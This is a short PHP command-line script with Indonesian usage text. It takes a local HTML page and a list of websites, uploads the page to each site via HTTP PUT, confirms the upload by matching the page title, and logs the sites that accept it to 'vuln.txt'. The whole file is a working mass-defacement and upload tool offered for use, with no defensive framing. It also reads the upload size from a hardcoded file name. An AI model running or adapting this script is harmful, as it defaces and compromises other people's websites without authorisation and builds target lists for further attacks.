<?php
echo "\e[1;37m";
echo "Cara Pakai: php ".$argv[0]." sclu.html listweb.txt\n";
if(file_exists($argv[1])){
  if(file_exists($argv[2])){
    $sc   = fopen($argv[1],'r');
    $ole = file_get_contents($argv[1]);
    $get = file_get_contents($argv[2]);
    $exp = explode("\n",$get);
    foreach($exp as $dom){
      $rep = str_replace('https://','http://',$dom);
      if(preg_match('#http://#',$rep)){
        $target = $rep."/".$argv[1];
      }else{
        $target = "http://".$rep."/".$argv[1];
      }
      $ch = curl_init();
      curl_setopt($ch,CURLOPT_URL,$target);
      curl_setopt($ch,CURLOPT_FOLLOWLOCATION,1);
      curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
      curl_setopt($ch,CURLOPT_USERAGENT,"Mozilla/5.0 (X11; Linux x86_64; rv:24.0) Gecko/20140722 Firefox/24.0 Iceweasel/24.7.0");
      curl_setopt($ch,CURLOPT_PUT,1);
      curl_setopt($ch,CURLOPT_INFILE,$sc);
      curl_setopt($ch,CURLOPT_INFILESIZE,filesize('99.html'));
      curl_setopt($ch,CURLOPT_COOKIEJAR,'coker_log');
      curl_setopt($ch,CURLOPT_COOKIEFILE,'coker_log');
      $exec = curl_exec($ch);
      curl_close($ch);
      preg_match_all('/<title>(.*?)<\/title>/',$ole,$data);
      if(preg_match("/".$data[1][0]."/",ngecurl($target))){
        echo $target."\e[1;32m OK!\e[1;37m\n";
        file_put_contents('vuln.txt',$target."\n",FILE_APPEND);
      }else{
        echo $target."\e[1;31m Error!\e[1;37m\n";
      }
      sleep(1);
    }
  }
}

function ngecurl($site){
  $ch = curl_init ("$site");
  curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt ($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
  curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt ($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_COOKIEJAR,'coker_log');
  curl_setopt($ch, CURLOPT_COOKIEFILE,'coker_log');
  $data3 = curl_exec ($ch);
  return $data3;
}
